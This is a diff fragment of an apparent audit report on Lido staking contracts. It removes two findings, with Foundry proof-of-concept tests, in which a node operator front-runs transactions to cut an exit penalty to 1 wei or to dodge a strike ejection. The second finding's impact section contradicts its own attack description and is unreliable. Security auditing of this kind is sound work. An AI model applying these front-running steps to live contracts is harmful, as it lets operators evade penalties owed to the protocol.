-2. A legitimate actor (e.g., a Lido-maintained bot) creates and submits a transaction that calls `processTriggeredExit` with the actual fee paid, `withdrawalRequestPaidFee = 0.1 ether`.
-3. An attacker, who could be the Node Operator or a colluding party, sees this transaction in the mempool.
-4. The attacker crafts a new transaction calling `processTriggeredExit` for the same validator, but with `withdrawalRequestPaidFee = 1 wei`.
-5. The attacker broadcasts their transaction with a higher gas fee to ensure it is mined before the legitimate one (front-running).
-6. The attacker's transaction executes first, and `CSExitPenalties` records a penalty of 1 wei for the validator.
-7. The legitimate transaction is mined next. Its call to `processTriggeredExit` sees that a fee has already been recorded (`isValue` is true) and returns without making any changes.
-8. As a result, the Node Operator is only penalized for 1 wei instead of the intended 0.1 ether, successfully evading the penalty.
-
-## Proof of Code
-```solidity
-// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
-// SPDX-License-Identifier: GPL-3.0
-
-pragma solidity 0.8.24;
-
-import { Test, console } from "forge-std/Test.sol";
-import { CSExitPenalties } from "src/CSExitPenalties.sol";
-import { ExitPenaltyInfo, MarkedUint248 } from "src/interfaces/ICSExitPenalties.sol";
-import { ICSModule } from "src/interfaces/ICSModule.sol";
-import { ICSAccounting } from "src/interfaces/ICSAccounting.sol";
-import { ICSParametersRegistry } from "src/interfaces/ICSParametersRegistry.sol";
-
-// Mocks for dependencies
-contract CSModuleMock is ICSModule {
-    ICSAccounting internal _accounting;
-    function setAccounting(address accountingAddress) public {
-        _accounting = ICSAccounting(accountingAddress);
-    }
-    function accounting() external view returns (ICSAccounting) {
-        return _accounting;
-    }
-    // Implement other necessary functions from ICSModule if needed, otherwise leave empty
-    function getNodeOperatorsCount() external view returns (uint256) { return 0; }
-    function getNodeOperator(uint256) external view returns (NodeOperator memory) { revert(); }
-    function getNodeOperatorSummary(uint256) external view returns (NodeOperatorSummary memory) { revert(); }
-    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) { revert(); }
-    function isStuck(uint256, uint256) external view returns (bool) { return false; }
-}
-
-contract CSAccountingMock is ICSAccounting {
-    mapping(uint256 => uint256) internal _bondCurveIds;
-    function getBondCurveId(uint256 nodeOperatorId) external view returns (uint256) {
-        return _bondCurveIds[nodeOperatorId];
-    }
-    function setBondCurveId(uint256 nodeOperatorId, uint256 curveId) public {
-        _bondCurveIds[nodeOperatorId] = curveId;
-    }
-    // Implement other necessary functions if needed
-    function getBond(uint256) external view returns (uint256) { return 0; }
-    function getBondRequired(uint256, uint256) external view returns (uint256) { return 0; }
-}
-
-contract CSParametersRegistryMock is ICSParametersRegistry {
-    mapping(uint256 => uint256) internal _maxFees;
-    function getMaxWithdrawalRequestFee(uint256 curveId) external view returns (uint256) {
-        return _maxFees[curveId];
-    }
-    function setMaxWithdrawalRequestFee(uint256 curveId, uint256 fee) public {
-        _maxFees[curveId] = fee;
-    }
-    // Implement other necessary functions if needed
-    function getAllowedExitDelay(uint256) external view returns (uint256) { return 0; }
-    function getExitDelayPenalty(uint256) external view returns (uint256) { return 0; }
-    function getBadPerformancePenalty(uint256) external view returns (uint256) { return 0; }
-}
-
-contract CSExitPenaltiesPoCTest is Test {
-    CSExitPenalties internal penalties;
-    CSModuleMock internal module;
-    CSAccountingMock internal accounting;
-    CSParametersRegistryMock internal paramsRegistry;
-
-    uint256 internal constant NODE_OPERATOR_ID = 1;
-    bytes internal constant PUB_KEY = "0xdeadbeef";
-    uint256 internal constant STRIKES_EXIT_TYPE_ID = 1;
-
-    function setUp() public {
-        module = new CSModuleMock();
-        accounting = new CSAccountingMock();
-        paramsRegistry = new CSParametersRegistryMock();
-
-        module.setAccounting(address(accounting));
-
-        penalties = new CSExitPenalties(address(module), address(paramsRegistry), address(this));
-
-        accounting.setBondCurveId(NODE_OPERATOR_ID, 1);
-        paramsRegistry.setMaxWithdrawalRequestFee(1, 1 ether);
-    }
-
-    function test_PoC_FrontrunTriggeredExit() public {
-        uint256 legitimateFee = 0.1 ether;
-        uint256 frontrunFee = 1 wei;
-
-        // 1. Attacker's front-running transaction is mined first
-        vm.prank(address(module));
-        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, frontrunFee, STRIKES_EXIT_TYPE_ID);
-
-        // Check that the fee recorded is the minimal front-run fee
-        ExitPenaltyInfo memory penaltyInfo = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
-        assertEq(penaltyInfo.withdrawalRequestFee.value, frontrunFee, "Fee should be the minimal front-run fee");
-        assertTrue(penaltyInfo.withdrawalRequestFee.isValue, "Fee should be marked as set");
-
-        // 2. Legitimate transaction is mined second
-        vm.prank(address(module));
-        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, legitimateFee, STRIKES_EXIT_TYPE_ID);
-
-        // Check that the fee is NOT updated to the legitimate fee
-        penaltyInfo = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
-        assertEq(penaltyInfo.withdrawalRequestFee.value, frontrunFee, "Fee should NOT be updated to the legitimate fee");
-
-        // The Node Operator successfully avoided the legitimate penalty.
-        assertTrue(legitimateFee > penaltyInfo.withdrawalRequestFee.value, "Penalty was successfully reduced");
-    }
-}
-```
-
-## Suggested Mitigation
-The function should be modified to prevent the "first report wins" scenario. Instead of only accepting the first reported fee, the contract should record the highest valid fee reported. This would disincentivize front-running with a low fee, as a subsequent report with a higher, legitimate fee would overwrite it. The logic should compare the incoming fee with the currently stored fee and update it only if the new fee is higher.
-
-```solidity
-// 2025-07-lido-finance/src/CSExitPenalties.sol:121
-function processTriggeredExit(
-    uint256 nodeOperatorId,
-    bytes calldata publicKey,
-    uint256 withdrawalRequestPaidFee,
-    uint256 exitType
-) external onlyModule {
-    if (exitType == VOLUNTARY_EXIT_TYPE_ID) {
-        return;
-    }
-
-    bytes32 keyPointer = _keyPointer(nodeOperatorId, publicKey);
-    ExitPenaltyInfo storage exitPenaltyInfo = _exitPenaltyInfo[keyPointer];
-
-    uint256 curveId = ACCOUNTING.getBondCurveId(nodeOperatorId);
-    uint256 maxFee = PARAMETERS_REGISTRY.getMaxWithdrawalRequestFee(
-        curveId
-    );
-
-    uint256 newFee = Math.min(withdrawalRequestPaidFee, maxFee);
-    uint256 currentFee = 0;
-    if (exitPenaltyInfo.withdrawalRequestFee.isValue) {
-        currentFee = exitPenaltyInfo.withdrawalRequestFee.value;
-    }
-
-    if (newFee > currentFee) {
-        exitPenaltyInfo.withdrawalRequestFee = MarkedUint248(
-            newFee.toUint248(),
-            true
-        );
-        emit TriggeredExitFeeRecorded({
-            nodeOperatorId: nodeOperatorId,
-            exitType: exitType,
-            pubkey: publicKey,
-            withdrawalRequestPaidFee: withdrawalRequestPaidFee,
-            withdrawalRequestRecordedFee: newFee
-        });
-    }
-}
-```
-
-## [I-2]. Frontrun/Backrun/Sandwhich MEV issue in CSEjector::ejectBadPerformer
-
-## Description
-The `ejectBadPerformer` function, callable only by the trusted `STRIKES` contract, is susceptible to front-running by a malicious node operator. The function checks if a validator is already withdrawn and reverts if so:
-
-```solidity
-// src/CSEjector.sol:229-231
-if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndex)) {
-    revert AlreadyWithdrawn();
-}
-```
-
-If a node operator anticipates an ejection call for their validator from the `STRIKES` contract (e.g., by monitoring the mempool), they can broadcast their own transaction calling `voluntaryEject` or `voluntaryEjectByArray` with a higher gas fee. If the operator's transaction is mined first, the validator's status will eventually be marked as withdrawn. Consequently, the `STRIKES` contract's subsequent call to `ejectBadPerformer` will revert, causing the transaction to fail and wasting the gas paid by the bot/oracle. This allows a node operator to grief the trusted oracle infrastructure and potentially evade penalties associated with a strike-based ejection (`STRIKES_EXIT_TYPE_ID`) by registering a voluntary exit (`VOLUNTARY_EXIT_TYPE_ID`) instead.
-
-## Impact
-A call to ejectBadPerformer will revert only if the validator has ALREADY completed its withdrawal and the module storage was updated beforehand – a situation that is expected and benign. VoluntaryEject cannot set the withdrawn flag, so a node-operator cannot pre-emptively front-run the STRIKES tx to cause a revert in the same block. No additional attack surface or meaningful griefing vector exists.
-
-## Proof of Concept
-1. The `STRIKES` contract's automated bot detects poor performance for a validator belonging to a specific Node Operator and creates a transaction to call `CSEjector.ejectBadPerformer`.
-2. The Node Operator monitors the mempool and sees this incoming transaction.
-3. The Node Operator quickly creates and broadcasts a transaction to call `CSEjector.voluntaryEject` for the same validator, but with a higher gas price to ensure it gets mined first.
-4. The Node Operator's transaction succeeds, initiating a voluntary exit.
-5. When the bot's transaction is eventually mined, the `ejectBadPerformer` call checks the validator's status, finds it has been withdrawn (or an exit has been initiated), and reverts due to the `AlreadyWithdrawn()` check.
-6. The bot's transaction fails, and the gas fee is wasted. The Node Operator successfully avoided a strike-based ejection.
-
-## Proof of Code
-```solidity
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.24;
-
-import { Test, console } from "forge-std/Test.sol";
-import { CSEjector } from "src/CSEjector.sol";
-import { ICSModule, NodeOperator } from "src/interfaces/ICSModule.sol";
-import { ILidoLocator } from "src/interfaces/ILidoLocator.sol";
-import { ITriggerableWithdrawalsGateway, ValidatorData } from "src/interfaces/ITriggerableWithdrawalsGateway.sol";
-
-// --- Mocks ---
-
-address constant LIDO_LOCATOR = address(0x10c);
-address constant TRIGGERABLE_WITHDRAWALS_GATEWAY = address(0x11c);
-address constant MODULE = address(0x12c);
-address constant STRIKES = address(0x13c);
-address constant ADMIN = address(0x14c);
-
-contract MockLidoLocator is ILidoLocator {
-    function triggerableWithdrawalsGateway() external pure returns (address) {
-        return TRIGGERABLE_WITHDRAWALS_GATEWAY;
-    }
-    function lido() external pure returns (address) { return address(0); }
-    function burner() external pure returns (address) { return address(0); }
-    function treasury() external pure returns (address) { return address(0); }
-    function insuranceFund() external pure returns (address) { return address(0); }
-    function stakingRouter() external pure returns (address) { return address(0); }
-    function withdrawalQueue() external pure returns (address) { return address(0); }
-    function withdrawalVault() external pure returns (address) { return address(0); }
-    function oracle() external pure returns (address) { return address(0); }
-    function validatorsExitBusOracle() external pure returns (address) { return address(0); }
-    function depositSecurityModule() external pure returns (address) { return address(0); }
-    function elRewardsVault() external pure returns (address) { return address(0); }
-}
-
-contract MockTriggerableWithdrawalsGateway is ITriggerableWithdrawalsGateway {
-    event WithdrawalsTriggered(ValidatorData[] exitsData, address refundRecipient, uint8 exitTypeId);
-    function triggerFullWithdrawals(ValidatorData[] calldata exitsData, address refundRecipient, uint8 exitTypeId) external payable {
-        emit WithdrawalsTriggered(exitsData, refundRecipient, exitTypeId);
-    }
-}
-
-contract MockCSModule is ICSModule {
-    mapping(uint256 => address) public nodeOperatorOwners;
-    mapping(uint256 => mapping(uint256 => bool)) public withdrawnValidators;
-    uint256 public totalKeys;
-
-    function setNodeOperator(uint256 noId, address owner, uint256 numKeys) public {
-        nodeOperatorOwners[noId] = owner;
-        totalKeys = numKeys;
-    }
-
-    function markAsWithdrawn(uint256 noId, uint256 keyIndex) public {
-        withdrawnValidators[noId][keyIndex] = true;
-    }
-
-    function getNodeOperatorOwner(uint256 nodeOperatorId) external view returns (address) {
-        return nodeOperatorOwners[nodeOperatorId];
-    }
-    
-    function isValidatorWithdrawn(uint256 nodeOperatorId, uint256 keyIndex) external view returns (bool) {
-        return withdrawnValidators[nodeOperatorId][keyIndex];
-    }
-
-    function getNodeOperatorTotalDepositedKeys(uint256) external view returns (uint256) {
-        return totalKeys;
-    }
-
-    function getSigningKeys(uint256, uint256, uint256 keysCount) external pure returns (bytes memory) {
-        bytes memory pubkeys = new bytes(48 * keysCount);
-        return pubkeys;
-    }
-
-    function LIDO_LOCATOR() external pure returns (ILidoLocator) {
-        return ILidoLocator(LIDO_LOCATOR);
-    }
-    function addNodeOperator(address,address,bytes32[] calldata,uint256[] calldata,address) external {}
-    function setNodeOperatorType(uint256,uint256) external {}
-    function reportELRewardsStealingPenalty(uint256,uint256) external {}
-    function settleELRewardsStealingPenalty(uint256) external {}
-    function submitWithdrawals(uint256[] calldata,uint256[] calldata) external {}
-    function obtainDepositData(uint256) external returns(bytes[] memory, bytes[] memory) { return (new bytes[](0), new bytes[](0)); }
-    function decreaseOperatorVettedKeys(uint256,uint256) external {}
-    function setProposedManagerAddress(uint256,address) external {}
-    function confirmManagerAddress(uint256) external {}
-    function setProposedRewardAddress(uint256,address) external {}
-    function confirmRewardAddress(uint256) external {}
-    function addSigningKeys(uint256,bytes32[] calldata,uint256[] calldata) external {}
-    function removeSigningKeys(uint256,uint256,uint256) external {}
-    function removeSigningKeysByIndices(uint256,uint256[] calldata) external {}
-    function setNodeOperatorActive(uint256,bool) external {}
-    function getNodeOperatorsCount() external pure returns(uint256) {return 0;}
-    function getNodeOperator(uint256) external view returns(NodeOperator memory) { return NodeOperator({totalAddedKeys: 0, totalDepositedKeys: 0, totalVettedKeys: 0, totalExitedKeys: 0, totalWithdrawnKeys: 0, stuckValidatorsCount: 0, refundRecipient: address(0), proposedManagerAddress: address(0), proposedRewardAddress: address(0), managerAddress: address(0), rewardAddress: address(0), depositableValidatorsCount: 0, enqueuedCount: 0}); }
-    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) { return(0,0,0); }
-    function getSigningKey(uint256,uint256) external pure returns (bytes32,uint256) {return (bytes32(0),0);}
-}
-
-contract FrontrunEjectorTest is Test {
-    CSEjector ejector;
-    MockCSModule mockModule;
-    MockLidoLocator mockLocator;
-    MockTriggerableWithdrawalsGateway mockGateway;
-
-    address noOwner = makeAddr("noOwner");
-    address strikesBot = STRIKES; // The STRIKES contract is the bot for this test
-    address refundRecipient = makeAddr("refundRecipient");
-
-    uint256 constant NODE_OPERATOR_ID = 1;
-    uint256 constant KEY_INDEX = 5;
-    uint256 constant STAKING_MODULE_ID = 99;
-
-    function setUp() public {
-        mockLocator = new MockLidoLocator();
-        vm.etch(LIDO_LOCATOR, address(mockLocator).code);
-
-        mockGateway = new MockTriggerableWithdrawalsGateway();
-        vm.etch(TRIGGERABLE_WITHDRAWALS_GATEWAY, address(mockGateway).code);
-
-        mockModule = new MockCSModule();
-        vm.etch(MODULE, address(mockModule).code);
-        
-        ejector = new CSEjector(MODULE, STRIKES, STAKING_MODULE_ID, ADMIN);
-
-        mockModule.setNodeOperator(NODE_OPERATOR_ID, noOwner, 10);
-    }
-
-    function test_poc_frontrun_ejectBadPerformer() public {
-        // 1. STRIKES bot's tx to call ejectBadPerformer is in the mempool.
-
-        // 2. Node Operator front-runs by calling voluntaryEject with a higher gas price.
-        vm.prank(noOwner);
-        ejector.voluntaryEject(NODE_OPERATOR_ID, KEY_INDEX, 1, refundRecipient);
-
-        // 3. To simulate the state change, we mark the validator as withdrawn in the mock.
-        mockModule.markAsWithdrawn(NODE_OPERATOR_ID, KEY_INDEX);
-
-        // 4. The bot's transaction is now executed and is expected to revert.
-        vm.prank(strikesBot);
-        vm.expectRevert(CSEjector.AlreadyWithdrawn.selector);
-        ejector.ejectBadPerformer(NODE_OPERATOR_ID, KEY_INDEX, refundRecipient);
-    }
-}
-```
-
-## Suggested Mitigation
-The `ejectBadPerformer` function should not revert if the validator is already withdrawn. Instead, it should handle the case gracefully, for example by returning successfully without taking further action or by emitting an event. This prevents the transaction from failing and protects the `STRIKES` contract/bot from being griefed.
-
-```solidity
-// Suggested fix in CSEjector.sol
-function ejectBadPerformer(
-    uint256 nodeOperatorId,
-    uint256 keyIndex,
-    address refundRecipient
-) external payable whenResumed onlyStrikes {
-    // ... (previous checks)
-
-    if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndex)) {
-        // Instead of reverting, just return or emit an event.
-        // This prevents the caller's transaction from failing.
-        return;
-    }
-
-    ValidatorData[] memory exitsData = new ValidatorData[](1);
-    // ... rest of the function
-}
-```
+Add an upper bound on `bondCurve.length` inside `_validateBondCurve` (both during creation and update). A limit of 256–512 intervals is already far beyond any realistic economic need and keeps worst-case gas usage comfortably below the block limit.
 
 
 
